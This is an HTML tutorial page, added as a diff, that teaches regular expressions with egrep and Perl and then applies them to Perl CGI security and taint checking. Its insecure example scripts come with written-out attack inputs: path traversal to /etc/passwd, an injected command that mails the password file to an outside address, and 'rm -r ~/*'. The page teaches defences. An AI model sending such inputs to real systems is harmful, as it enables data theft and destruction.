@@ -1,0 +1,770 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html>
+<head>
+<title>Perl Security and Regular Expressions </title>
+	<meta name="author" content="Andrew Cantino">
+	<meta name="GENERATOR" content = "Almost Free Text v5.094; Copyright 1996-2004 Todd Coram. All rights reserved.">
+<style type="text/css">
+  <!--
+html { background: #eee; color: #000; }
+
+body { background: #eee; color: #000; margin: 0; padding: 0;}
+
+div.body {
+	background: #fff; color: #000;
+	margin: 0 1em 0 1em; padding: 1em;
+	font-family: serif;
+	font-size: 1em; line-height: 1.2em;
+	border-width: 0 1px 0 1px;
+	border-style: solid;
+	border-color: #aaa;
+}
+
+div.block {
+	background: #F8F8FF; color: #000;
+	margin: 1em; padding: 0 1em 0 1em;
+	border-width: 1px;
+	border-style: solid;
+	border-color: #909090;
+}
+
+table {
+	background: #F8F8F8; color: #000;
+	margin: 1em;
+	border-width: 0 0 0 1px;
+	border-style: solid;
+	border-color: #C0C0C0;
+}
+
+td {
+	border-width: 0 1px 1px 0;
+	border-style: solid;
+	border-color: #C0C0C0;
+}
+
+th {
+	background: #F8F8FF;
+	border-width: 1px 1px 2px 0;
+	border-style: solid;
+	border-color: #C0C0C0;
+}
+
+
+/* body text, headings, and rules */
+
+p { margin: 0; text-indent: 0em; margin: 0 0 0.5em 0 }
+
+h1, h2, h3, h4, h5, h6 {
+	color: #206020; background: transparent;
+	font-family: Optima, Arial, Helvetica, sans-serif;
+	font-weight: normal;
+}
+
+h1 { font-size: 1.69em; margin: 1.4em 0 0.4em 0; }
+h2 { font-size: 1.44em; margin: 1.4em 0 0.4em 0; }
+h3 { font-size: 1.21em; margin: 1.4em 0 0.4em 0; }
+h4 { font-size: 1.00em; margin: 1.4em 0 0.4em 0; }
+h5 { font-size: 0.81em; margin: 1.4em 0 0.4em 0; }
+h6 { font-size: 0.64em; margin: 1.4em 0 0.4em 0; }
+
+hr {
+	color: transparent; background: transparent;
+	height: 0px; margin: 0.6em 0;
+	border-width: 1px ;
+	border-style: solid;
+	border-color: #999;
+}
+
+/* bulleted lists and definition lists */
+
+ul { margin: 0 1em 0.6em 2em; padding: 0; }
+li { margin: 0.4em 0 0 0; }
+
+dl { margin: 0.6em 1em 0.6em 2em; }
+dt { color: #206020; }
+
+tt { color: #602020; }
+
+/* links */
+
+a.link {
+	color: #33c; background: transparent;
+	text-decoration: none;
+}
+
+a:hover {
+	color: #000; background: transparent;
+}
+
+body > a {
+	font-family: Optima, Arial, Helvetica, sans-serif;
+	font-size: 0.81em;
+}
+
+h1, h2, h3, h4, h5, h6 {
+	color: #206020; background: transparent;
+	font-family: Optima, Arial, Helvetica, sans-serif;
+	font-weight: normal;
+}
+
+  -->
+</style>
+</head>
+<body>
+<div class="body">
+
+<br><center><h1><a name="AFT-top">Perl Security and Regular Expressions </a></h1></center>
+<br><center><h2>Andrew Cantino</h2></center>
+<center><img src="email.jpg" alt="" align=bottom></center><br clear=all>
+<center><img src="camel.gif" alt="" align=bottom></center><br clear=all>
+<hr>
+<!--  AFT Table of Contents (auto generated) -->
+<ul>
+<li> <a class="link" href="#Introduction">Introduction</a></li>
+<li> <a class="link" href="#Learning regular expressions with Grep">Learning regular expressions with Grep</a></li>
+<li> <a class="link" href="#More about regular expressions">More about regular expressions</a></li>
+<ul>
+<li> <a class="link" href="#Alternation">Alternation</a></li>
+<li> <a class="link" href="#Quantification">Quantification</a></li>
+<li> <a class="link" href="#Grouping">Grouping</a></li>
+<li> <a class="link" href="#Character classes">Character classes</a></li>
+<ul>
+<li> <a class="link" href="#Character class ranges">Character class ranges</a></li>
+</ul>
+<li> <a class="link" href="#Try it for yourself!">Try it for yourself!</a></li>
+</ul>
+<li> <a class="link" href="#Perl Regular Expressions">Perl Regular Expressions</a></li>
+<ul>
+<li> <a class="link" href="#Simple matching">Simple matching</a></li>
+<li> <a class="link" href="#Perl regular expression special characters">Perl regular expression special characters</a></li>
+<li> <a class="link" href="#Search and replace">Search and replace</a></li>
+<li> <a class="link" href="#Greedy vs. ungreedy matching">Greedy vs. ungreedy matching</a></li>
+<li> <a class="link" href="#Learning more">Learning more</a></li>
+</ul>
+<li> <a class="link" href="#Perl Security">Perl Security</a></li>
+<ul>
+<li> <a class="link" href="#An example security hole">An example security hole</a></li>
+<li> <a class="link" href="#A second example">A second example</a></li>
+<li> <a class="link" href="#Commands to be careful of">Commands to be careful of</a></li>
+</ul>
+<li> <a class="link" href="#Read more">Read more</a></li>
+<li> <a class="link" href="#Perl Taint Checking">Perl Taint Checking</a></li>
+<ul>
+<li> <a class="link" href="#Turning on taint checking">Turning on taint checking</a></li>
+<li> <a class="link" href="#Tainted data">Tainted data</a></li>
+<li> <a class="link" href="#Untainting data">Untainting data</a></li>
+<li> <a class="link" href="#Other issues">Other issues</a></li>
+</ul>
+<li> <a class="link" href="#Security issues with GET and POST">Security issues with GET and POST</a></li>
+<li> <a class="link" href="#Suggested Assignments">Suggested Assignments</a></li>
+<ul>
+<li> <a class="link" href="#Play with RegEx">Play with RegEx</a></li>
+<li> <a class="link" href="#Write a secure CGI script">Write a secure CGI script</a></li>
+<li> <a class="link" href="#Read more!">Read more!</a>
+
+</li>
+</ul>
+</ul>
+<hr>
+<!-- Start SectLevel1 -->
+
+<center>
+<script type="text/javascript"><!--
+google_ad_client = "pub-3067017907226343";
+google_ad_width = 728;
+google_ad_height = 90;google_ad_format = "728x90_as";google_ad_type = "text"; google_ad_channel ="6334296398";
+google_color_border = "FFFFFF";
+google_color_bg = "FFFFFF";
+google_color_link = "0000FF";
+google_color_url = "008000";
+google_color_text = "000000";
+//--></script>
+<script type="text/javascript"
+  src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+    </script>
+      </center>
+
+<h2><a name="Introduction">Introduction</a></h2>
+<p class="Body">
+Regular expressions are an incredibly powerful shorthand for searching, replacing, and matching strings.  A very simple regular expression might look like:
+<div class="block"><pre>
+/^andrew/
+</pre></div>
+or
+<div class="block"><pre>
+/(this|that)/
+</pre></div>
+We're going to learn about regular expressions, then talk about how we can use them to make our Perl CGI scripts more secure.
+</p>
+<!--End Section 1-->
+<h2><a name="Learning regular expressions with Grep">Learning regular expressions with Grep</a></h2>
+<p class="Body">
+<tt>Grep</tt> is a UNIX command-line tool designed for searching files.  Given a search pattern (a regular expression) and a file, <tt>grep</tt> returns all of the lines in the file that contain the search pattern.  <tt>Grep</tt> can handle most regular expressions, so we're going to be using it as an introductory tool, before moving on to Perl regular expressions.  We're actually using a version of <tt>grep</tt> called <tt>egrep</tt>, and here is the syntax:
+<div class="block"><pre>
+egrep 'regular expression' filename
+</pre></div>
+Lets start by making a file to experiment on.  <a class="link" href="l1.html#SSH">Login to your shell account</a> and use <tt>pico</tt> or another editor to create a new file called <em>testfile</em>, containing at least the following lines (you can copy and paste):
+<div class="block"><pre>
+mississippi
+andrew
+dog
+cat
+john
+john doe
+missouri
+the quick brown fox jumps over the lazy dog.
+kayak
+</pre></div>
+Now, lets <tt>egrep</tt> the file.
+<div class="block"><pre>
+-jailshell-2.05b$ egrep 'doe' testfile 
+john doe
+</pre></div>
+Notice that <tt>egrep</tt> returned the one line in the file that contained <em>doe</em>.  Lets try a few others:
+<div class="block"><pre>
+-jailshell-2.05b$ egrep 'rew' testfile 
+andrew
+-jailshell-2.05b$ egrep 'ss' testfile 
+mississippi
+missouri
+</pre></div>
+The expression <em>rew</em> matched one line, while the expression <em>ss</em> occurred both in <em>mississippi</em> and <em>missouri</em>.  Now, what if we want to match things at the beginning or end of a line?  The special carrot (<tt>^</tt>) character, if it appears at the beginning of a regular expression, matches the beginning of a line.  Likewise, the special dollar sign (<tt>$</tt>) character, when at the end of an expression, matches the end of a line.
+<div class="block"><pre>
+-jailshell-2.05b$ egrep '^a' testfile 
+andrew
+-jailshell-2.05b$ egrep '^mi' testfile 
+mississippi
+missouri
+-jailshell-2.05b$ egrep '^john' testfile 
+john
+john doe
+-jailshell-2.05b$ egrep '^john$' testfile 
+john
+</pre></div>
+If you actually wanted to make a <tt>^</tt> or <tt>$</tt>, you would need to <em>escape</em> them, just like we have to do with backslashes in Perl.  To search for a carrot, you would do <tt>\^</tt>.
+</p>
+<!--End Section 1-->
+<h2><a name="More about regular expressions">More about regular expressions</a></h2>
+<p class="Body">
+The period (<tt>.</tt>) character will match any single character, except the new line (<tt>&#92;n</tt>) character.  For example:
+<div class="block"><pre>
+-jailshell-2.05b$ egrep 'd.g' testfile 
+dog
+the quick brown fox jumps over the lazy dog.
+-jailshell-2.05b$ egrep '..ss.ss....' testfile 
+mississippi
+</pre></div>
+</p>
+<!-- Start SectLevel2 -->
+<h3><a name="Alternation">Alternation</a></h3>
+<p class="Body">
+The pipe (<tt>|</tt>) character &quot;separates alternatives<a name="REFfNOTE1">&nbsp</a><sup><a class="link" href="#fNOTE1">1</a></sup>.&quot;  For example:
+<div class="block"><pre>
+-jailshell-2.05b$ egrep 'andrew|john' testfile 
+andrew
+john
+john doe
+</pre></div>
+</p>
+<!--End Section 2-->
+<h3><a name="Quantification">Quantification</a></h3>
+<p class="Body">
+Quantifier special characters specify how many times the preceding character can match.  Here is a table of quantifiers:
+</p>
+<!-- 2 columns --><center><table cellspacing="0">
+<caption> <strong>Quantifiers</strong> </caption>
+<tr><th> <strong>Character</strong> </th><th> <strong>Description</strong> </th></tr>
+<tr><td>  <tt>+</tt> </td><td> The plus sign indicates that the preceding character may occur one or more times  </td></tr>
+<tr><td>  <tt>?</tt> </td><td> The question mark indicates that the preceding character may occur at most one time  </td></tr>
+<tr><td>  <tt>*</tt> </td><td> The asterisk indicates that the preceding character may occur zero or more times     </td></tr>
+<tr><td>  <tt>{n}</tt> </td><td> The preceding character must occur <tt>n</tt> times.&nbsp;&nbsp;&nbsp;&nbsp;  </td></tr>
+<tr><td>  <tt>{n,}</tt> </td><td> The preceding character must occur at least <tt>n</tt> times.      </td></tr>
+<tr><td>  <tt>{n,m}</tt> </td><td> The preceding character must occur at least <tt>n</tt> times, but not more than <tt>m</tt> times. </td></tr>
+</table></center>
+<p class="Body">
+And some examples:
+<div class="block"><pre>
+-jailshell-2.05b$ egrep 'a.+w' testfile 
+andrew
+-jailshell-2.05b$ egrep '^.{3}$' testfile 
+dog
+cat
+</pre></div>
+The expression <tt>a.+w</tt> matches an <em>a</em>, followed by any number of characters (except zero), followed by a <em>w</em>.  The expression <tt>^.{3}$</tt> uses <tt>^</tt> and <tt>$</tt> to lock to the beginning and end of the line, and matches any three characters.  It finds any lines that contain only three characters.
+</p>
+<!--End Section 2-->
+<h3><a name="Grouping">Grouping</a></h3>
+<p class="Body">
+You can use parenthesis and alternation to group alternatives.
+<div class="block"><pre>
+-jailshell-2.05b$ egrep '^.(o|a).$' testfile 
+dog
+cat
+-jailshell-2.05b$ egrep '(ss|fox|doe)' testfile 
+mississippi
+john doe
+missouri
+the quick brown fox jumps over the lazy dog.
+</pre></div>
+The expression <tt>(ss|fox|doe)</tt> matches lines containing <tt>ss</tt> or the word <tt>fox</tt> or the word <tt>doe</tt>.  Parentheses also cause the regular expression engine to remember their contents.  This is very useful for pulling sub-expressions out of strings, as we'll see in a little bit.  It also lets us do some powerful matching:
+<div class="block"><pre>
+-jailshell-2.05b$ egrep '(.)(.).\2\1' testfile 
+mississippi
+kayak
+</pre></div>
+Escaped numbers (<tt>\1</tt>, <tt>\2</tt>, <tt>\3</tt>, etc.) return the value of the corresponding parentheses set.  Therefore, the expression <tt>(.)(.).\2\1</tt> matches any two characters, followed by any single character, followed by the first two matched characters in reverse.  It finds the <em>ssiss</em> in <em>mississippi</em>, and notices that <em>kayak</em> is a palindrome!
+</p>
+<!--End Section 2-->
+
+<center>
+<script type="text/javascript"><!--
+google_ad_client = "pub-3067017907226343";
+google_ad_width = 728;
+google_ad_height = 90;google_ad_format = "728x90_as";google_ad_type = "text"; google_ad_channel ="6334296398";
+google_color_border = "FFFFFF";
+google_color_bg = "FFFFFF";
+google_color_link = "0000FF";
+google_color_url = "008000";
+google_color_text = "000000";
+//--></script>
+<script type="text/javascript"
+  src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+    </script>
+      </center>
+
+<h3><a name="Character classes">Character classes</a></h3>
+<p class="Body">
+Character classes are created with square brackets (<tt>[]</tt>).  They represent a list of alternative characters and are basically shorthand for groups.  The character class <tt>[abc]</tt> will match any single character if it is an <em>a</em>, <em>b</em>, or <em>c</em>, and is equivalent to <tt>(a|b|c)</tt>.  It is important not to confuse these with groups because character classes are <em>a list of alternative characters</em>, <strong>not</strong> words.  Therefore, <tt>[andrew]</tt> matches any of the characters <em>a</em>, <em>n</em>, <em>d</em>, <em>r</em>, <em>e</em>, and <em>w</em>, <strong>not</strong> the string <em>andrew</em>.  The carrot (<tt>^</tt>) character at the beginning of a character class means <em>not these characters</em>.  Don't confuse it with a carrot at the beginning of the regular expression, which matches to the beginning of the line, as we saw before.  Examples:
+<div class="block"><pre>
+-jailshell-2.05b$ egrep '^[mispour]+$' testfile 
+mississippi
+missouri
+-jailshell-2.05b$ egrep '^[^mispour]+$' testfile 
+cat
+kayak
+</pre></div>
+The first expression matches any line that contains only the characters <em>m</em>, <em>i</em>, <em>s</em>, <em>p</em>, <em>o</em>, <em>u</em>, and <em>r</em>.  The second expression matches only a line that <strong>does not</strong> contain those characters.
+</p>
+<!-- Start SectLevel3 -->
+<h4><a name="Character class ranges">Character class ranges</a></h4>
+<p class="Body">
+A nice feature of character classes is that you can use ranges.  Ranges are specified with the dash (<tt>-</tt>) character, and they look like this: <tt>[a-z]</tt>.  You can also combine multiple ones.  This would match any alphanumeric character: <tt>[a-zA-Z0-9]</tt>.
+</p>
+<!--End Section 3-->
+<!-- End SectLevel3 -->
+<!--End Section 2-->
+<h3><a name="Try it for yourself!">Try it for yourself!</a></h3>
+<p class="Body">
+Now try these examples for yourself!  Try to come up with lots of different patterns and experiment with them.  I recommend that you remember to use the shell history (hit the up arrow on your keyboard) to save yourself typing.
+</p>
+<!--End Section 2-->
+<!-- End SectLevel2 -->
+<!--End Section 1-->
+<h2><a name="Perl Regular Expressions">Perl Regular Expressions</a></h2>
+<p class="Body">
+Regular expressions in Perl are very similar to the regular expressions that we've just covered.  Perl just takes them one step further.  For the definitive guide to Perl regular expressions, see the <a class="link" href="http://www.perl.com/doc/manual/html/pod/perlre.html">perldoc perlre page</a>.
+</p>
+<!-- Start SectLevel2 -->
+<h3><a name="Simple matching">Simple matching</a></h3>
+<p class="Body">
+In Perl, regular expressions can take quite a few forms, but the most common uses the <tt>=~</tt> operator.  The <tt>=~</tt> operator performs a regular expression test on the variable to the left of the operator, using the expression to the right of the operator.  In general, Perl regular expressions will be inside forward slashes (<tt>//</tt>).  Here is an example:
+<div class="block"><pre>
+#!/usr/bin/perl
+$j = &quot;this is my test string&quot;;
+if ($j =~ /test/) {
+	print &quot;Yup, it matches!&quot;;
+}
+</pre></div>
+And another example.  (I'll leave out the shebang line for brevity.)
+<div class="block"><pre>
+$j = &quot;My name is Andrew.&quot;;
+if ($j =~ /name is (\w*)\./) {
+	print &quot;Yup, it matches, and your name is $1!\n&quot;;
+}
+</pre></div>
+<strong>Output:</strong> Yup, it matches, and your name is Andrew!
+</p>
+<ul>
+<li> Here I've used the special <tt>\w</tt> character, which means &quot;any word character.&quot;  In other words, alphanumeric plus underscore (_).  I'll list some more special characters soon.  The subexpression <tt>(\w*)\.</tt> means: find any number of words characters up to a period.  Recall that I had to escape the period because period has a special meaning in regular expressions.</li>
+<li> In Perl, anything inside of parenthesis is memorized, and is available as <tt>$1</tt>, <tt>$2</tt>, <tt>$3</tt>, etc. after the regular expression has parsed.</li>
+</ul>
+<!--End Section 2-->
+<h3><a name="Perl regular expression special characters">Perl regular expression special characters</a></h3>
+<p class="Body">
+Citing from <a class="link" href="http://www.perl.com/doc/manual/html/pod/perlre.html">perlre</a>:
+<div class="block"><pre>
+    \w  Match a &quot;word&quot; character (alphanumeric plus &quot;_&quot;)
+    \W  Match a non-word character
+    \s  Match a whitespace character
+    \S  Match a non-whitespace character
+    \d  Match a digit character
+    \D  Match a non-digit character
+</pre></div>
+</p>
+<!--End Section 2-->
+<h3><a name="Search and replace">Search and replace</a></h3>
+<p class="Body">
+Another common regular expression formulation in Perl looks like:
+<div class="block"><pre>
+$variable =~ s/find/replace/gi;
+</pre></div>
+<ul>
+<li> <tt>=~ s///</tt> does a find and replace.  Both the find and replace strings can be full regular expressions.</li>
+<li> The <tt>gi</tt> at the end of the expression are <em>modifiers</em>.  You can modify any regular expression, not just search and replace.  Here are the meanings of these two modifiers:</li>
+<ul>
+<li> <tt>i</tt> -- do case-insensitive matching</li>
+<li> <tt>g</tt> -- find all occurrences of the match, not just one (i.e., global search and replace)</li>
+</ul>
+</ul>
+</p>
+<p class="Body">
+More examples:
+<div class="block"><pre>
+# Remove HTML tags (not a particularly good way to do this)
+$variable =~ s/\&lt;[^\&gt;]+\&gt;//g;
+
+# Filter input, leaving only numbers.
+$shouldBeNumber =~ s/[^0-9]//g;
+</pre></div>
+</p>
+<!--End Section 2-->
+<h3><a name="Greedy vs. ungreedy matching">Greedy vs. ungreedy matching</a></h3>
+<p class="Body">
+The following is copied from <a class="link" href="http://www.troubleshooters.com/codecorn/littperl/perlreg.htm#Greedy">Steve Litt's Perl of Wisdom: Perl Regular Expressions</a>:
+</p>
+<p class="Body">
+&quot;Perl regular expressions normally match the longest string possible. For instance:
+<div class="block"><pre>
+my($text) = &quot;mississippi&quot;;
+$text =~ m/(i.*s)/;
+print $1 . &quot;\n&quot;;
+</pre></div>
+Run the preceding code, and here's what you get:
+<div class="block"><pre>
+ississ
+</pre></div>
+It matches the first <tt>i</tt>, the last <tt>s</tt>, and everything in between them. But what if you want to match the first <tt>i</tt> to the <tt>s</tt> most closely following it?  Use this code:
+<div class="block"><pre>
+my($text) = &quot;mississippi&quot;;
+$text =~ m/(i.*?s)/;
+print $1 . &quot;\n&quot;;
+</pre></div>
+Now look what the code produces:
+<div class="block"><pre>
+is
+</pre></div>
+Clearly, the use of the question mark makes the match ungreedy.&quot;  Understanding greedy vs. ungreedy matching is very helpful when writing regular expressions.
+</p>
+<!--End Section 2-->
+<h3><a name="Learning more">Learning more</a></h3>
+<p class="Body">
+We've only scratched the surface of what regular expressions can do.  To learn more, try these resources:
+<ul>
+<li> <a class="link" href="http://www.perl.com/doc/manual/html/pod/perlre.html">Perl</a></li>
+<li> <a class="link" href="http://www.troubleshooters.com/codecorn/littperl/perlreg.htm">Perl Regular Expressions</a></li>
+</ul>
+</p>
+<!--End Section 2-->
+<!-- End SectLevel2 -->
+<!--End Section 1-->
+
+<center>
+<script type="text/javascript"><!--
+google_ad_client = "pub-3067017907226343";
+google_ad_width = 728;
+google_ad_height = 90;google_ad_format = "728x90_as";google_ad_type = "text"; google_ad_channel ="6334296398";
+google_color_border = "FFFFFF";
+google_color_bg = "FFFFFF";
+google_color_link = "0000FF";
+google_color_url = "008000";
+google_color_text = "000000";
+//--></script>
+<script type="text/javascript"
+  src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+    </script>
+      </center>
+
+<h2><a name="Perl Security">Perl Security</a></h2>
+<blockquote>
+&quot;The problem with CGI scripts is that each one presents yet another opportunity for exploitable bugs. CGI scripts should be written with the same care and attention given to Internet servers themselves, because, in fact, they are miniature servers. Unfortunately, for many Web authors, CGI scripts are their first encounter with network programming.&quot; -- <a class="link" href="http://www.w3.org/Security/Faq/wwwsf4.html">w3.org Security Faq</a>
+</blockquote>
+<p class="Body">
+Now that we've talked about regular expressions, we're equipped to discuss a very important issue: Perl and CGI security.  Today we will cover taint checking and Perl security.  In the next few lessons, we will cover other aspects of security in web publishing.
+</p>
+<p class="Body">
+Whenever you're writing CGI scripts, it is essential that you take security into account.  Maintaining good security makes it harder for someone to accidentally or maliciously gain access to your account, your server, and your data.  Keep these points in mind:
+</p>
+<ul>
+<li> A computer always does what you tell it to.  The idea is to make sure that it's doing what you intend it to do.</li>
+<li> Make sure that someone else cannot accidentally or maliciously make your code do something you don't want it to do.</li>
+<li> Malformed input can compromise the system, so we need to make sure input looks like what we expect.</li>
+<li> <strong>Never</strong> trust data coming from an outside source.  Never hide things through obscurity.</li>
+</ul>
+<p class="Body">
+Let me show you a few examples where security is an issue.
+</p>
+<!-- Start SectLevel2 -->
+<h3><a name="An example security hole">An example security hole</a></h3>
+<p class="Body">
+The following CGI script is <strong>not secure</strong>!  Don't use it!
+<div class="block"><pre>
+#!/usr/bin/perl
+use CGI;
+$c = new CGI;
+print $c-&gt;header();
+print &quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Data lookup&lt;/title&gt;&lt;/head&gt;&lt;body&gt;\n&quot;;
+$dataFile = &quot;/home/acantino/datafiles/&quot; . $c-&gt;param('file');
+open(FILE, $dataFile);
+@data = &lt;FILE&gt;;
+close(FILE);
+print &quot;Data:&lt;br&gt;\n&quot;;
+print @data;
+print &quot;&lt;/body&gt;&lt;/html&gt;&quot;;
+</pre></div>
+What did we do wrong here?  Lets see... if we name this CGI <tt>test.cgi</tt>, and connect to <tt>test.cgi?file=testfile</tt>, where <tt>testfile</tt> exists in <tt>/home/acantino/datafiles</tt>, then we will get the contents of <tt>testfile</tt>.  If everything in that directory is a file that we want to share with the web, than this is safe, right?  <strong>No!</strong>
+<ul>
+<li> What if we go to <tt>test.cgi?file=../.bash_history</tt>?  Then my shell history file is displayed, including passwords, if I've been so foolish as to type passwords at the command line.</li>
+<li> Even worse: <tt>test.cgi?file=../../../../etc/passwd</tt>  That's the system password file!</li>
+</ul>
+Okay, so how do we fix this?  One would think that filtering out periods (<tt>.</tt>) would be sufficient...
+<div class="block"><pre>
+...
+$file = $c-&gt;param('file');
+$file =~ s/[\.]//g;
+$dataFile = &quot;/home/acantino/datafiles/&quot; . $file;
+open(FILE, $dataFile);
+...
+</pre></div>
+Now, when someone enters <tt>../../../../etc/passwd</tt>, the system sees: <tt>////etc/passwd</tt>.  This isn't a valid path, so that's okay, although we had better filter out slashes too, just to be safe: <tt>$file =~ s/[\.&#92;/]//g;</tt>  However, we haven't filtered out the tilde (<tt>~</tt>) or pipe (<tt>|</tt>) characters, among others.  These can also be abused.  In general, it is <strong>never</strong> safe to just remove characters that you think are dangerous.  Rather, you need to filter out all characters except the ones that you want:
+<div class="block"><pre>
+$file = $c-&gt;param('file');
+$file =~ s/[^a-zA-Z0-9]//g;
+</pre></div>
+That does it!  Now, the <strong>only</strong> characters that can be in <tt>$file</tt> are <tt>a</tt> through <tt>z</tt>, <tt>A</tt> through <tt>Z</tt>, and <tt>0</tt> through <tt>9</tt>.  At minimum, always do this!
+</p>
+<!--End Section 2-->
+<h3><a name="A second example">A second example</a></h3>
+<p class="Body">
+One way to send an e-mail from Perl would look like this<a name="REFfNOTE2">&nbsp</a><sup><a class="link" href="#fNOTE2">2</a></sup>:  (Again, <strong>don't</strong> actually do this!)
+<div class="block"><pre>
+#!/usr/bin/perl
+use CGI;
+$c = new CGI;
+$mail_to = $c-&gt;param('email');
+print $c-&gt;header();
+if ($mail_to =~ /.*?\@.*?\..*?/) {
+        open (MAIL,&quot;|/usr/lib/sendmail $mail_to&quot;);
+        print MAIL &quot;To: $mailto\nFrom: me@test.com\n\n&quot;;
+        print MAIL &quot;This is a very insecure example e-mail!\n&quot;;
+        close(MAIL);
+        print &quot;sent an e-mail!\n&quot;;
+} else {
+        print &quot;Sorry, not an e-mail address!\n&quot;;
+}
+</pre></div>
+What's wrong with this?  It'll only send e-mail to an address that looks like <tt>someone@something.com</tt>.  However, what if someone entered the following:
+<div class="block"><pre>
+junk@notreal.com; mail bhat@crackers.org &lt; /etc/passwd;
+</pre></div>
+Because the <tt>open</tt> command uses a pipe (<tt>|</tt>), it is actually executing a shell, and therefore the semi-colon delimits a new command and <tt>open</tt> both sends the e-mail and also sends a second e-mail to <tt>bhat@crackers.org</tt> containing the password file!  They could even do this:
+<div class="block"><pre>
+junk@notreal.com; rm -r ~/*;
+</pre></div>
+That would delete everything you own!  Don't try it!  Here, like above, we need to filter out everything that couldn't be in an e-mail address:
+<div class="block"><pre>
+$mail_to =~ s/[^a-zA-Z0-9\.\-\_\@]//g;
+</pre></div>
+</p>
+<p class="Body">
+To make the <tt>open</tt> command more secure, avoid pipes, explicitly use <tt>&gt;</tt>, <tt>&gt;&gt;</tt>, or <tt>&lt;</tt>, and use <tt>open</tt> with this syntax:
+<div class="block"><pre>
+open(FILEHANDLE, &quot;&lt;&quot;, $filepath);
+</pre></div>
+</p>
+<!--End Section 2-->
+<h3><a name="Commands to be careful of">Commands to be careful of</a></h3>
+<p class="Body">
+Besides <tt>open</tt>, you also need to be very careful when using any command that executes a shell or code.  Use the following extremely carefully, and always completely filter anything coming from the Internet or user.
+<ul>
+<li> <tt>backticks (``)</tt></li>
+<li> <tt>system()</tt></li>
+<li> <tt>eval()</tt></li>
+</ul>
+</p>
+<!--End Section 2-->
+<!-- End SectLevel2 -->
+<!--End Section 1-->
+<h2><a name="Read more">Read more</a></h2>
+<p class="Body">
+The following sites are excellent:
+<ul>
+<li> <a class="link" href="http://www.extropia.com/tutorials/security/index.html">Introduction to web security</a></li>
+<li> <a class="link" href="http://users.sdsc.edu/~cedwards/securitynotes.html">Perl CGI Security Notes by Chris</a></li>
+</ul>
+</p>
+<!--End Section 1-->
+
+<center>
+<script type="text/javascript"><!--
+google_ad_client = "pub-3067017907226343";
+google_ad_width = 728;
+google_ad_height = 90;google_ad_format = "728x90_as";google_ad_type = "text"; google_ad_channel ="6334296398";
+google_color_border = "FFFFFF";
+google_color_bg = "FFFFFF";
+google_color_link = "0000FF";
+google_color_url = "008000";
+google_color_text = "000000";
+//--></script>
+<script type="text/javascript"
+  src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+    </script>
+      </center>
+
+<h2><a name="Perl Taint Checking">Perl Taint Checking</a></h2>
+<p class="Body">
+Because CGI scripts are notorious for security holes, Perl provides something called <em>taint checking</em>.  Tainted data is data that has come from a user and has not been filtered.  Taint checking is a <em>run-time</em><a name="REFfNOTE3">&nbsp</a><sup><a class="link" href="#fNOTE3">3</a></sup> process that limits where tainted data can be used.
+</p>
+<!-- Start SectLevel2 -->
+<h3><a name="Turning on taint checking">Turning on taint checking</a></h3>
+<p class="Body">
+In your CGI script, use the <tt>-T</tt> option when calling Perl.  I also recommend that you redirect STDERR so that you can maintain an error log for your script.
+<div class="block"><pre>
+#!/usr/bin/perl -T
+$errorLog = &quot;/home/acantino/public_html/test/error&quot;;
+open (STDERR, &quot;&gt;&gt;$errorLog&quot;);
+</pre></div>
+</p>
+<!--End Section 2-->
+<h3><a name="Tainted data">Tainted data</a></h3>
+<p class="Body">
+Any data that has come from a user will be internally marked as tainted.  Any time you add tainted data to existing data, the existing data becomes tainted.  Perl will exit with an error when you try to use tainted data in a function that could be potentially dangerous, such as <tt>system</tt>, backtick operators, piped <tt>open()</tt>, etc.
+</p>
+<p class="Body">
+Because taint checking is a runtime process, a bad script will usually run, but not function properly, so you have to thoroughly test your code.
+</p>
+<!--End Section 2-->
+<h3><a name="Untainting data">Untainting data</a></h3>
+<p class="Body">
+The whole point of taint checking is to make your script securely use user data.  To do this, we have to untaint data with regular expressions.  The only<a name="REFfNOTE4">&nbsp</a><sup><a class="link" href="#fNOTE4">4</a></sup> way that you can untaint data is to pull out a sub-expression from your user data:
+<div class="block"><pre>
+$email = $c-&gt;param('email');   # tainted
+if ($email =~ m/^([a-zA-Z0-9\.\_\-\@]*)/) {   # $email still tainted
+    $email = $1;   # $email no longer tainted
+} else {
+    print "E-mail invalid!\n";
+}
+</pre></div>
+Perl assumes that if you're taking sub-expressions, you know what you're doing.  <strong>Never</strong> do this: <tt>$email =~ m/^(.*)$/;</tt>  That defeats the whole purpose of taint checking!
+</p>
+<!--End Section 2-->
+
+<center>
+<script type="text/javascript"><!--
+google_ad_client = "pub-3067017907226343";
+google_ad_width = 728;
+google_ad_height = 90;google_ad_format = "728x90_as";google_ad_type = "text"; google_ad_channel ="6334296398";
+google_color_border = "FFFFFF";
+google_color_bg = "FFFFFF";
+google_color_link = "0000FF";
+google_color_url = "008000";
+google_color_text = "000000";
+//--></script>
+<script type="text/javascript"
+  src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+    </script>
+      </center>
+
+<h3><a name="Other issues">Other issues</a></h3>
+<p class="Body">
+Taint checking also slightly modifies the functioning of <tt>system()</tt>, <tt>require()</tt>, and <tt>use()</tt> commands.  You may see something like the following:
+<div class="block"><pre>
+Insecure $ENV{PATH} while running with -T switch at test.cgi line 9.
+</pre></div>
+This occurs because Perl taint checking requires you to specify a secure path.  If you see this, then you need to set your $ENV{PATH} variable at the top of your script.  The following two lines should work in conjunction with always using absolute paths to anything you access (which you should be doing anyway):
+<div class="block"><pre>
+delete @ENV{qw(IFS CDPATH ENV BASH_ENV)};   # Make %ENV safer
+$ENV{'PATH'} = '/bin:/usr/bin:/usr/local/bin';
+</pre></div>
+</p>
+<p class="Body">
+I highly recommend that you read the following page to learn more:
+<ul>
+<li> <a class="link" href="http://gunther.web66.com/FAQS/taintmode.html">CGI/Perl Taint Mode FAQ</a></li>
+</ul>
+</p>
+<!--End Section 2-->
+<!-- End SectLevel2 -->
+<!--End Section 1-->
+<h2><a name="Security issues with GET and POST">Security issues with GET and POST</a></h2>
+<p class="Body">
+As a final side note, there are a few security concerns that distinguish GET and POST when used in CGI scripts.
+<ul>
+<li> Since GET shows up in a script's url, it is visible in the URL bar of a browser.  Therefore,  anything sent by GET could be <em><a class="link" href="http://www.google.com/search?hl=en&amp;lr=&amp;client=safari&amp;rls=en-us&amp;q=define%3A+shoulder+surf&amp;btnG=Search">shoulder surfed</a></em>.</li>
